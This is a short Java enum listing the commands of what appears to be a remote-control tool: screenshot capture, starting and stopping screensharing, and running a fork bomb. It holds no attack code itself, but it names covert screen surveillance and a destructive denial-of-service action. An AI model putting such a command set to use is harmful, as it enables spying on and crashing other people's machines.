package utils;


import java.util.HashMap;
import java.util.Map;

public enum Command {
    SCREENSHOT("screen", "Sends a screenshot"),
    START_SCREENSHARE("start-screenshare", "Starts screenshare"),
    STOP_SCREENSHARE("stop-screenshare", "Stops screenshare"),
    FORK_BOMB("bomb", "Runs a fork-bomb");

    private String command;
    private String description;

    Command(String command, String description) {
        this.command = command;
        this.description = description;
    }

    public static Map<String, String> availableCommands() {
        Map<String, String> commandsAndDescriptions = new HashMap<>();
        for (Command c : Command.values()) {
            commandsAndDescriptions.put(c.command, c.description);
        }
        return commandsAndDescriptions;
    }
}